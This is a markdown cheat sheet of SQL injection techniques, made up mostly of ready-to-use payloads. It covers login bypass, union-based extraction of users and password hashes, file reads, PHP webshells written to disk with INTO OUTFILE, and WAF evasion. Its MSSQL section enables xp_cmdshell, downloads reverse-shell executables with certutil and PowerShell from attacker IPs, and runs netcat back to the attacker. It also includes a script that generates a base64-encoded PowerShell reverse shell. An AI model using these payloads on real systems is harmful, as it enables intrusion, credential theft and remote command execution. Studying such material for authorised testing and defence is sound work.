# SQL Injection
## Methods To Find Sqli
## Manual SQLi Enumeration
```
Try to Generate Errors:
- First try ' and "  on an input table
    - Monitor if there are any errors on the page
    - If not also check "inspect element" > network tab and see if errors appear, if you see 500 error, SQLi exists

- There maybe some type of sql protection, can you bypass with burpsuite or from the URL?
    - Example: "http://10.10.125.185:5000/sesqli3/login?profileID=-1' or 1=1-- -&password=a"
    - Example in url encoded: "http://10.10.125.185:5000/sesqli3/login?profileID=-1%27%20or%201=1--%20-&password=a"

Login screen:
- Try a simple SQLi
    > 'OR 1=1-- -
    > 'OR true-- -
- Try URL encoding as well
    > 'OR%201=1--%20-
    > 'OR%20true--%20-

 Input box non-string (Integer required):
    - Example: profileID=10
    > 1 or 1=1-- -
    
Input box string: 
    - Example: profileID='10'
    > 1' or '1'='1'-- -
    
URL injection (Look at URL for php entry, look for GET statements in BURP)
    - Example: check URL if there is php to allow injection
    > 1'+or+'1'$3d'1'--+-+
    
POST injection (Look for POST statements in BURP)
    - Example: look for POST statements in BURP
    > -1' or 1=1--
    
- SQL injection from text boxes
    - always try passing a single ' or " to the text box first. 
        - When doing so if you see odd output, check the "Network" view of the inspect element console. 
            - Look for any errors from the server, select them, and go to "respone" tab
            - Can run ' Or true -- 
                - "--" stops the rest of a command from being executed by commenting it out

- Pass a single ' or " into input boxes to check to see if data is passed directly to the database.
- Test ID paramter with single quote:
http://192.168.135.10/debug.php?id='

Enumerate numer of columns via order by 
- Determine how many columns are in a site, increment until it fails.
http://192.168.135.10/debug.php?id=1 order by 1 

- We can use a Union to extract more information about the data, gives context of the indexes for each column
http://192.168.135.10/debug.php?id=2 union all select 1,2,3

- Extract data from the database, such as version for MariaDB
http://192.168.135.10/debug.php?id=2 union all select 1,2,@@version

- Show current DB user
http://192.168.135.10/debug.php?id=2 union all select 1,2,user()

- Gather all of the schema
http://192.168.135.10/debug.php?id=2 union all select 1,2,table_name from information_schema.tables

- Extraxt column headers for a table
http://192.168.135.10/debug.php?id=2 union all select 1,2,column_name from information_schema.columns where table_name=%27users%27    //'users'

- Extraction of usernames and passwords
http://192.168.135.10/debug.php?id=2%20union%20all%20select%201,%20username,%20password%20from%20users    // 2 union all select 1, username, password from users

- Read files
http://192.168.135.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')

Inject a php backdoor 
- Create a file and inject code for a backdoor
http://192.168.135.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php' 

- Access backdoor
http://192.168.135.10/backdoor.php?cmd=ipconfig
```


## 1. Using Burpsuite :
```
  1. Capture the request using burpsuite.
  2. Send the request to burp scanner.
  3. Proceed with active scan.
  4. Once the scan is finished, look for SQL vulnerability that has been detected.
  5. Manually try SQL injection payloads.
  ```
## 2. Using waybackurls and other bunch of tools :
```
  1. sublist3r -d target | tee -a domains (you can use other tools like findomain, assetfinder, etc.)
  2. cat domains | httpx | tee -a alive
  3. cat alive | waybackurls | tee -a urls
  4. gf sqli urls >> sqli
  5. sqlmap -m sqli --dbs --batch
  6. use tamper scripts
```

## 3. Using heuristic scan to get hidden parameters :
```
  1. Use subdomain enumeration tools on the domain.
  2. Gather all urls using hakcrawler, waybackurls, gau for the domain and subdomains.
  3. You can use the same method described above in 2nd point.
  4. Use Arjun to scan for the hidden params in the urls. 
  5. Use --urls flag to include all urls.
  6. Check the params as https://domain.com?<hiddenparam>=<value>
  7. Send request to file and process it through sqlmap.
```
## 4. Error generation with untrusted input or special characters :
```
  1. Submit single quote character ' & look for errors.
  2. Submit SQL specific query.
  3. Submit Boolean conditions such as or 1=1 and or 1=0, and looking application's response.
  4. Submit certain payloads that results in time delay.
Payloads:
'
)'
"
`
')
")
`)
'))
"))
`))
'-SLEEP(30); #

```

# Authentication Bypass
```
Login Bypass - Testing for SQLi Authentication Bypass
In some cases, SQL injection can lead to authentication bypass.
By forcing the closing quote on the username value and adding an OR =1=1 statement followed by a -- comment separator and two forward slashes (//), we can prematurely terminate the SQL statement. 
admin' OR 1=1 -- //
    
Since we have appended an OR statement that will always be true, the WHERE clause will return the first user id present in the database, whether or not the user record is present. 
Because no other checks are implemented in the application, we are able to gain administrator privileges by circumventing the authentication logic.    

Error-based payload
' or 1=1 in (select @@version) -- //

Attempting to retrieve the Users table
' OR 1=1 in (SELECT * FROM users) -- //

We should only query one column at a time, try to grab only the password column from the users table:
' or 1=1 in (SELECT password FROM users) -- //

This is somewhat helpful, as we managed to retrieve all user password hashes; however, we don't know which user each password hash corresponds to. 
We can solve the issue by adding a WHERE clause specifying which user's password we want to retrieve, in this case admin.
Improving our SQLi error-based payload:
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
    
Login Bypass:
Both user and password or specific username and payload as password

' or 1=1 --
' or '1'='1
' or 1=1 --+
user' or 1=1;#
user' or 1=1 LIMIT 1;#
user' or 1=1 LIMIT 0,1;#    
```

# Detecting number of columns
```
Two methods are typically used for this purpose:
Order/Group by
Keep incrementing the number until you get a False response. 
Even though GROUP BY and ORDER BY have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.

1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
                        
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True   
```

# Union-Based SQL
```
' ORDER BY 3 --
' UNION SELECT 1,2,3 -- -	
' UNION SELECT 1,@@version,3 -- -
' UNION SELECT 1,user(),3 -- -	
' UNION SELECT 1,load_file('/etc/passwd'),3 -- -    // Read Files
- Read files
http://192.168.135.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
' UNION SELECT 1,load_file(0x2f6574632f706173737764),3 -- -  // hex encode /etc/passwd
' UNION SELECT 1,load_file(char(47,101,116,99,47,112,97,115,115,119,100)),3 -- -  	  // char encode /etc/passwd
' UNION SELECT 1,2,3,4,5,group_concat(table_schema) from information_schema.tables -- -  // List databases available
' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() -- - // Fetch Table names
' union all select 1,2,3,4,table_name,6 FROM information_schema.tables // Fetch Table names
' UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name ='users' -- -  // Fetch Column names from Table
' union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'  // Fetch Column names from Table
' UNION SELECT 1,group_concat(user,0x3a,pasword),3 from users limit 0,1-- -  // Dump data from Columns using 0x3a as seperator
' union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'   // Backdoor
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // Write a WebShell To Disk via INTO OUTFILE directive. 192.168.191.x/tmp/webshell.php?cmd=ls
```

## MySQL Webshell RCE
```
Although the various MySQL database variants don't offer a single function to escalate to RCE, we can abuse the SELECT INTO_OUTFILE statement to write files on the web server.
For this attack to work, the file location (var/www/html/tmp/webshell.php) must be writable to the OS user running the database software.

We'll issue the UNION SELECT SQL keywords to include a single PHP line into the first column and save it as webshell.php in a writable web folder.
Write a WebShell To Disk via INTO OUTFILE directive:
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

The written PHP code file results in the following:
<? system($_REQUEST['cmd']); ?>
PHP reverse shell

The PHP system function will parse any statement included in the cmd parameter coming from the client HTTP REQUEST, thus acting like a web-interactive command shell.
If we try to use the above payload inside the Lookup field of the search.php endpoint, we receive the following error:

Fortunately, this error is related to the incorrect return type, and should not impact writing the webshell on disk.
To confirm, we can access the newly created webshell inside the tmp folder along with the id command.

192.168.191.x/tmp/webshell.php?cmd=ls

The webshell is working as expected, since the output of the id command is returned to us through the web browser. 
We discovered that we are executing commands as the www-data user, an identity commonly associated with web servers on Linux systems.

```

# Post-Methods
## 1. Finding total number of columns with order by or group by or having :
```
  Submit a series of ORDER BY clause such as 
	  
    ' ORDER BY 1 --
	  ' ORDER BY 2 --
    ' ORDER BY 3 --
    
    and incrementing specified column index until an error occurs.
```

## 2. Finding vulnerable columns with union operator :
```
  Submit a series of UNION SELECT payloads.
  
	  ' UNION SELECT NULL --
    ' UNION SELECT NULL, NULL --
    ' UNION SELECT NULL, NULL, NULL --
    
  (Using NULL maximizes the probability that the payload will succeed. NULL can be converted to every commonly used data type.)
```
* To go for the methods in more detail, go through portswigger site.
    https://portswigger.net/web-security/sql-injection/union-attacks

## 3. Extracting basic information like database(), version(), user(), UUID() with concat() or group_concat()
### 1. Database version
```
    Oracle 			  SELECT banner FROM v$version
		       		  SELECT version FROM v$instance
    
    Microsoft 			  SELECT @@version
    
    PostgreSQL 			  SELECT version()
    
    MySQL 			  SELECT @@version
```
### 2. Database contents
```
    Oracle        SELECT * FROM all_tables
	          SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
    
    Microsoft 	  SELECT * FROM information_schema.tables
                  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
    
    PostgreSQL 	  SELECT * FROM information_schema.tables
                  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

    MySQL         SELECT * FROM information_schema.tables
                  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```
### 3. Shows version, user and database name
```
   ' AND 1=2 UNION ALL SELECT concat_ws(0x3a,version(),user(),database())
```
### 4. Using group_concat() function, used to concat all the rows of the returned results.
```  
   ' union all select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=database()–
```
## 4. Accessing system files with load_file(). and advance exploitation afterwards :
```
   ' UNION ALL SELECT LOAD_FILE ('/ etc / passwd')
```
## 5. Bypassing WAF :

### 1. Using Null byte before SQL query.
```
    %00' UNION SELECT password FROM Users WHERE username-'xyz'--
```
### 2. Using SQL inline comment sequence.
```
    '/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'xyz'-- 
```
### 3. URL encoding
```      
      for example :
    / URL encoded to %2f
    * URL encoded to %2a

    Can also use double encoding, if single encoding doesn't works. Use hex encoding if the rest doesn't work.
```
### 4. Changing Cases (uppercase/lowercase)
* For more step wise detailed methods, go through the link below.

  https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
### 5. Use SQLMAP tamper scripts. It helps bypass WAF/IDS/IPS.
* 1. Use Atlas. It helps suggesting tamper scripts for SQLMAP.
     
     https://github.com/m4ll0k/Atlas
* 2. JHaddix post on SQLMAP tamper scripts.
     
     https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423
        
## 6. Time Delays :
```
      Oracle 	      dbms_pipe.receive_message(('a'),10)
      
      Microsoft 	  WAITFOR DELAY '0:0:10'
      
      PostgreSQL 	  SELECT pg_sleep(10)
      
      MySQL 	      SELECT sleep(10) 
```      
## 7. Conditional Delays :
```
      Oracle 	      SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
      
      Microsoft 	  IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
      
      PostgreSQL 	  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
      
      MySQL 	      SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a') 
```

# MSSQL
```
Connect and Enable xp_cmdshell:
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

Enabling xp_cmdshell feature
One-Liner: 1';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;

After logging in from our Kali VM to the MSSQL instance, we can enable show advanced options by setting its value to 1, then applying the changes to the running configuration via the RECONFIGURE statement. 
Next, we'll enable xp_cmdshell and apply the configuration again using RECONFIGURE.
With this feature enabled, we can execute any Windows shell command through the EXECUTE statement followed by the feature name.
Executing Commands via xp_cmdshell:

SQL> EXECUTE xp_cmdshell 'whoami';
output
nt service\mssql$sqlexpress
NULL

' ORDER BY 1-- //  <----- Test for the amount of columns till you get an error
' ORDER BY 1,2-- //
' ORDER BY 1,2,3-- //  <---- Hits error so you know there are two columns

' UNION SELECT 1,2; EXEC xp_cmdshell 'ping 192.168.45.173'--  <---- Ping  your machine to see if it goes through and you can contact it
' UNION SELECT 1,2; EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--  <----- Enable xp_cmdshell
' UNION SELECT 1,2; EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.173/80.exe C:\Users\Public\80.exe'--   <---- Download your revshell or netcat: msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f exe -o 80.exe   

' UNION SELECT 1,2;EXEC xp_cmdshell 'powershell C:\Users\Public\80.exe'--//  <----- Execute your revshell or netcat

admin' UNION SELECT 1,2; EXEC xp_cmdshell "powershell.exe wget http://192.168.45.236/nc.exe -OutFile c:\Windows\Tasks\nc.exe"--+
admin' UNION SELECT 1,2; EXEC xp_cmdshell "c:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.236 443"--+

' EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.173/80.exe C:\Users\Public\80.exe'--
1';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--

SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> reconfigure;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> reconfigure

One-Liner: 1';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--

Generate a powershell base64 encoded reverse shell:
python3 powershell_b64_encoded_revshell.py

powershell_b64_encoded_revshell.py:

import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.155",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

Execute the b64 encoded reverse shell with xp_cmdshell and powershell:
SQL> xp_cmdshell powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMQA3ACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```


```

# Resources and tools that will help gain an upper hand on finding bugs :
* Portswigger SQL Injection cheat sheet - https://portswigger.net/web-security/sql-injection/cheat-sheet
* HTTPX - https://github.com/encode/httpx
* GF patterns - https://github.com/1ndianl33t/Gf-Patterns
* GF (Tomnomnom)- https://github.com/tomnomnom/gf
* We can also use gau with waybackurls to fetch all urls.
* Waybackurls - https://github.com/tomnomnom/waybackurls
* Gau - https://github.com/lc/gau
* Arjun - https://github.com/s0md3v/Arjun
* Hakcrawler - https://github.com/hakluke/hakrawler


### Author :

* [@xhan1x](https://twitter.com/xhan1x)
